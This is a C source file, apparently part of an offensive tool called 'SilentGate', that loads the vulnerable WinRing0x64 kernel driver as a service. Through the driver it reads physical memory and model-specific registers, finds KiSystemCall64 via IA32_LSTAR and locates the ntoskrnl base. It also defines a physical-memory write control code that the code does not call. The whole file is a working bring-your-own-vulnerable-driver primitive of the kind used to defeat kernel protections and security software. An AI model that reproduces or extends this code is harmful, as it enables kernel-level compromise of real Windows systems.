/*
 * SilentGate v9.0 - WinRing0 Physical Memory Test
 * Author: JarDani
 * Fixed: separate input/output buffers
 * Fixed: MSR read returns full 64-bit value
 */
#include <windows.h>
#include <psapi.h>
#include <stdio.h>

#define OLS_TYPE 40000

#define IOCTL_OLS_READ_MEMORY \
    CTL_CODE(OLS_TYPE, 0x841, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_MEMORY \
    CTL_CODE(OLS_TYPE, 0x842, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_MSR \
    CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(push,4)
typedef struct {
    LARGE_INTEGER Address;
    ULONG         UnitSize;
    ULONG         Count;
} OLS_READ_MEM_IN;

typedef struct {
    LARGE_INTEGER Address;
    ULONG         UnitSize;
    ULONG         Count;
    UCHAR         Data[1];
} OLS_WRITE_MEM_IN;

typedef struct {
    ULONG Register;
    ULONG EaxValue;
    ULONG EdxValue;
} OLS_READ_MSR_IN;
#pragma pack(pop)

static HANDLE g_hDev = INVALID_HANDLE_VALUE;

BOOL phys_read(DWORD64 addr, PVOID out, ULONG size) {
    OLS_READ_MEM_IN req = {0};
    req.Address.QuadPart = (LONGLONG)addr;
    req.UnitSize = 1;
    req.Count    = size;
    DWORD bytes  = 0;
    return DeviceIoControl(g_hDev, IOCTL_OLS_READ_MEMORY,
        &req, sizeof(req), out, size, &bytes, NULL);
}

DWORD64 read_msr64(DWORD index) {
    OLS_READ_MSR_IN buf = {index, 0, 0};
    DWORD bytes = 0;
    DeviceIoControl(g_hDev, IOCTL_OLS_READ_MSR,
        &buf, sizeof(buf), &buf, sizeof(buf), &bytes, NULL);
    return ((DWORD64)buf.EdxValue << 32) | buf.EaxValue;
}

DWORD64 get_ntos_base() {
    DWORD n = 0;
    EnumDeviceDrivers(NULL, 0, &n);
    LPVOID* d = (LPVOID*)malloc(n);
    EnumDeviceDrivers(d, n, &n);
    DWORD64 base = 0;
    char name[MAX_PATH];
    for (DWORD i = 0; i < n/sizeof(LPVOID); i++) {
        GetDeviceDriverBaseNameA(d[i], name, MAX_PATH);
        if (_stricmp(name,"ntoskrnl.exe")==0 ||
            _stricmp(name,"ntkrnlmp.exe")==0) {
            base=(DWORD64)d[i]; break;
        }
    }
    free(d);
    return base;
}

int load_driver(const char* path) {
    SC_HANDLE scm = OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE ex  = OpenServiceA(scm,"WinRing0x64",SERVICE_ALL_ACCESS);
    if (ex) {
        SERVICE_STATUS ss;
        ControlService(ex,SERVICE_CONTROL_STOP,&ss);
        DeleteService(ex); CloseServiceHandle(ex); Sleep(500);
    }
    SC_HANDLE svc = CreateServiceA(scm,"WinRing0x64","WinRing0x64",
        SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if (!svc){CloseServiceHandle(scm);return 0;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return ok;
}

void unload_driver() {
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE svc=OpenServiceA(scm,"WinRing0x64",SERVICE_ALL_ACCESS);
    if(svc){SERVICE_STATUS ss;
        ControlService(svc,SERVICE_CONTROL_STOP,&ss);
        Sleep(500);DeleteService(svc);CloseServiceHandle(svc);}
    CloseServiceHandle(scm);
}

int main() {
    printf("[V9] SilentGate v9.0 - Physical Memory Test\n");
    printf("[V9] Author: JarDani\n\n");

    char drv[MAX_PATH], dir[MAX_PATH];
    GetModuleFileNameA(NULL,dir,MAX_PATH);
    char* p=strrchr(dir,'\\'); if(p)*p='\0';
    snprintf(drv,MAX_PATH,"%s\\WinRing0x64.sys",dir);

    if(!load_driver(drv)){printf("[V9] Load failed\n");getchar();return 1;}

    g_hDev=CreateFileA("\\\\.\\WinRing0_1_2_0",
        GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(g_hDev==INVALID_HANDLE_VALUE){
        printf("[V9] Device failed: %lu\n",GetLastError());
        unload_driver();getchar();return 1;}

    printf("[V9] Device opened\n");

    /* Test MSR read */
    DWORD64 lstar = read_msr64(0xC0000082);
    printf("[V9] IA32_LSTAR (KiSystemCall64): 0x%llX\n", lstar);

    DWORD64 ntos = get_ntos_base();
    printf("[V9] ntoskrnl base: 0x%llX\n\n", ntos);

    /* Test physical read at known good addresses */
    /* Physical address 0x1000 is always mapped on x86-64 */
    printf("[V9] Testing physical reads...\n");

    BYTE buf[16]={0};
    for (DWORD64 test_addr = 0x1000;
         test_addr <= 0x10000;
         test_addr += 0x1000) {
        if (phys_read(test_addr, buf, 16)) {
            printf("[V9] phys 0x%llX OK: %02X %02X %02X %02X\n",
                test_addr, buf[0],buf[1],buf[2],buf[3]);
            break;
        }
    }

    CloseHandle(g_hDev);
    unload_driver();
    printf("\n[V9] Done - press Enter\n");
    getchar();
    return 0;
}
